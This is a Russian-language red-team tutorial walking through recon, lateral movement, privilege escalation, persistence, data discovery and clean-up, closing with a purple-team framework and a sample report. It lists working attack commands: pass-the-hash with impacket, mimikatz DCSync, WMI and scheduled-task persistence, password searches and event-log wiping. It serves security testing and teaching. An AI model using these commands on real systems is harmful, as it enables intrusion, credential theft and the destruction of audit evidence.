# Red Teaming: комплексное тестирование безопасности

## Введение

Red Teaming — это моделирование реальной атаки для проверки эффективности средств защиты и готовности команды реагирования. В отличие от пентеста, фокус на достижении цели, а не поиске уязвимостей.

## Фазы Red Team операции

### 1. Разведка (Reconnaissance)

```bash
# Пассивная разведка
# OSINT
theHarvester -d company.com -b all
maltego -i company.com

# Сбор данных
# LinkedIn employees
# Github repositories
# DNS enumeration
dnsrecon -d company.com -t brt

# Shodan
shodan host 185.234.xxx.xxx

# Сбор email
metagoofil -d company.com -t doc,pdf -o results
```

### 2. Внешнее проникновение (External Intrusion)

```markdown
## Attack vectors

### Email-based
- Spear phishing campaigns
- Malicious attachments
- Credential harvesting

### Web-based
- Watering hole attacks
- Supply chain compromise
- Third-party integrations

### Network-based
- VPN exploitation
- External services
- Cloud misconfigurations
```

### 3. Латеральное движение (Lateral Movement)

```bash
# Pass-the-Hash
impacket-psexec -hashes :aad3b435b51404eeaad3b435b51404ee DOMAIN/User@target

# Overpass-the-Hash
python3 getTGT.py DOMAIN/User -hashes :hash -outputfile TGT.ccache

# Pass-the-Ticket
export KRB5CCNAME=TGT.ccache
python3 psexec.py -k -no-pass DOMAIN/User@target

# Remote services
# WMI
wmic /user:DOMAIN\User /node:target process call create "powershell.exe -c ..."

# PsRemoting
Enter-PSSession -ComputerName target -Credential $cred
```

### 4. Эскалация привилегий (Privilege Escalation)

```powershell
# Windows Escalation
# PowerSploit
Import-Module .\PowerSploit.psm1
Get-System

# PrivescCheck
. .\PrivescCheck.ps1
Invoke-PrivescCheck

# Запуск от имени SYSTEM
psexec -s cmd.exe

# DCSync Attack
mimikatz # lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt
```

### 5. Персистенция (Persistence)

```powershell
# WMI Event Subscription
$filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "MyFilter"
    EventNamespace = 'root\subscription'
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 14"
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
    Name = "MyConsumer"
    CommandLineTemplate = "powershell.exe -c 'calc.exe'"
}

Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# Scheduled Task
schtasks /create /tn "UpdateService" /tr "powershell.exe -c ..." 
    /sc minute /mo 30 /ru SYSTEM
```

### 6. Доступ к данным (Data Access)

```bash
# Поиск конфиденциальных данных
# Windows
findstr /s /i /p "password" *.txt *.xml *.ini *.config
Get-ChildItem -Path C:\ -Recurse -Include *.xlsx | 
    Select-String -Pattern "confidential"

# Git repositories
git log --all --oneline --source --remotes |
    grep -i "prod\|staging\|secret"

# Cloud
# AWS S3 buckets
aws s3 ls s3://company-backups/ --recursive
```

### 7. Очистка следов (Clean-up)

```bash
# Удаление событий
# Windows
wevtutil cl Security
wevtutil cl System

# PowerShell
Clear-EventLog -LogName Security

# Удаление файлов
cipher /w:C:\

# Очистка bash history
history -c
rm -rf ~/.bash_history
```

## Purple Team Collaboration

```yaml
# Purple Team Exercise Framework
name: Purple Team Exercise 2024

objectives:
  - validate_detection_capabilities
  - improve_response_playbooks
  - identify_detection_gaps

scenarios:
  - name: Initial Access via Phishing
    ttps:
      - T1566.001
      - T1204.002
    expected_detection:
      - Email security gateway alert
      - EDR process tree
      - SIEM correlation rule
    success_criteria:
      - Detection within 5 minutes
      - Full attack chain observed
      
  - name: Lateral Movement
    ttps:
      - T1021.001
      - T1078
    expected_detection:
      - Unusual RDP connections
      - Account enumeration
    success_criteria:
      - Alert on first lateral move
```

## Red Team Tools

| Категория | Инструмент | Назначение |
|-----------|------------|------------|
| C2 | Cobalt Strike | Командный центр |
| C2 | Covenant | .NET C2 |
| C2 | Sliver | Go-based C2 |
| Exploitation | Metasploit | Эксплуатация |
| Exploitation | CrackMapExec | Латеральное движение |
| Escalation | PowerSploit | Windows PE |
| Credential | Mimikatz | Учетные данные |
| Pivoting | Ligolo-ng | Создание туннелей |
| Scanning | Nmap | Сканирование |

## Отчётность Red Team

```markdown
# Red Team Assessment Report

## Executive Summary
- **Assessment Period:** 2024-01-10 to 2024-01-20
- **Attack Goal:** Obtain domain admin access
- **Result:** ✓ Goal Achieved in 72 hours
- **Detection Rate:** 25% of attack steps

## Attack Timeline
| Phase | Time | Technique | Detected |
|-------|------|-----------|----------|
| Recon | Day 1 | OSINT | No |
| Access | Day 2 | Phishing | No |
| Escalation | Day 2 | LPE | No |
| Lateral | Day 3 | PTH | Yes |
| Persistence | Day 3 | WMI | No |
| Exfiltration | Day 3 | DNS | No |

## Key Findings
1. Email security failed to catch targeted phishing
2. EDR not monitoring PowerShell scripts
3. Lack of network segmentation
4. Weak privileged access controls

## Recommendations
1. Implement anti-phishing training
2. Enable PowerShell logging
3. Deploy micro-segmentation
4. Implement JIT administration
```

